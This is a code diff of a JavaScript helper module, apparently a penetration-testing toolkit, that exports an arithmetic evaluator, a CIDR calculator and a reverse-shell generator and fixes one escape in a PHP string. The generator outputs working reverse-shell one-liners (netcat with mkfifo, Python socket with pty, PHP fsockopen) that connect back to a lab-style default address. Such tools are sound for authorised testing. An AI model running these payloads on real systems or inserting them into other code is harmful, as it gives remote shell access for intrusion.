@@ -382,7 +382,7 @@ export function handleSearch(e) {
  * Safely evaluate a numeric arithmetic expression without eval/Function.
  * Returns null when the input is not a pure arithmetic expression.
  */
-function evaluateExpression(input) {
+export function evaluateExpression(input) {
   const expr = input.replace(/\^/g, '**');
   if (!/^[\d\s+\-*/().%*]+$/.test(expr)) return null;
   if (!/[+\-*/%]/.test(expr)) return null;
@@ -448,7 +448,7 @@ function evaluateExpression(input) {
 }
 
 
-function calculateCidr(cidrStr) {
+export function calculateCidr(cidrStr) {
   const match = cidrStr.trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
   if (!match) return "Usage: cidr <ip>/<mask> (e.g., cidr 192.168.1.0/24)";
   const ipParts = match[1].split('.').map(Number);
@@ -489,7 +489,7 @@ function calculateCidr(cidrStr) {
   ].join('\n');
 }
 
-function generateRevShells(ip = "10.10.14.2", port = "4444") {
+export function generateRevShells(ip = "10.10.14.2", port = "4444") {
   const safeIp = /^[0-9a-fA-F:.]{1,45}$/.test(ip) ? ip : '10.10.14.2';
   const safePort = /^\d{1,5}$/.test(port) ? port : '4444';
   return `REVERSE SHELL PAYLOADS (${safeIp}:${safePort}):
@@ -507,7 +507,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${safeIp} ${safePort} >/tmp/f
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${safeIp}",${safePort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
 [PHP exec]
-php -r '\\$sock=fsockopen("${safeIp}",${safePort});exec("sh <&3 >&3 2>&3");'`;
+php -r '$sock=fsockopen("${safeIp}",${safePort});exec("sh <&3 >&3 2>&3");'`;
 }
 
 function toHex(buffer) {
